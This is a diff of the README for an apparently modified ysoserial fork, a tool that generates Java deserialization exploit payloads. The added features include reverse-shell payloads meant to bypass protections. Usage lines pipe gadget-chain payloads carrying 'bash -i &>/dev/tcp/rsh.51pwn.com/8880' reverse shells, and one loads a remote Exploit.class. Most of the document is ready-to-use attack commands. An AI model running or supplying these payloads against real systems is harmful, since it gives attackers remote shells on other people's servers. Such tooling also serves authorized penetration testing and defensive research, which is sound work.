@@ -10,18 +10,22 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 ![logo](ysoserial.png)
 
 # New Features
+- exec_global: Default Ysoserial execution via Runtime.exec(command);
+- exec_win: Execute command using Runtime.exec(["cmd.exe", "/c", command]);
+- exec_unix: Execute command using Runtime.exec(["/bin/sh", "/c", command]);
+- java_reverse_shell: Native java reverse shell payload to avoid the use of Runtime.exec() and potentially bypass some protections;
 - add **CommonsCollections8**
 ```
 java -jar $mtx/../tools/ysoserial-all.jar CommonsCollections8 'https://rsh.51pwn.comExploit.class' 'exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1'
 ```
-- add CommonsCollections5js support "js code",ByPass java8 "java.lang.Override missing element entrySet"
+- add **CommonsCollections5js** support "js code",ByPass java8 "java.lang.Override missing element entrySet"
 ```
 java -jar $mtx/../tools/ysoserial-all.jar CommonsCollections5js "var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\");x.start().getInputStream();"|nc 127.0.0.1 4712
 ```
-- Allows java fragment code injection to be obtained from the environment variable **Custom_Code_51pwn** to solve complex command problems
+- add **ScriptEngineTemplate** Allows java fragment code injection to be obtained from the environment variable **Custom_Code_51pwn** to solve complex command problems
 eg:
 ```
-export Custom_Code_51pwn='java.lang.Runtime.getRuntime().exec(new String[]{"bash" ,"-c" ,"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"});'
+export Custom_Code_51pwn='new java.lang.ProcessBuilder(new String[]{"bash","-c","exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"}).start().getInputStream();'
 java -jar $mtx/../tools/ysoserial-all.jar CommonsBeanutils192NOCC "CLASS:ScriptEngineTemplate"
 ```
 - Allows java fragment code injection to be obtained from the current directory file **Custom_Code_51pwn** to solve complex problems
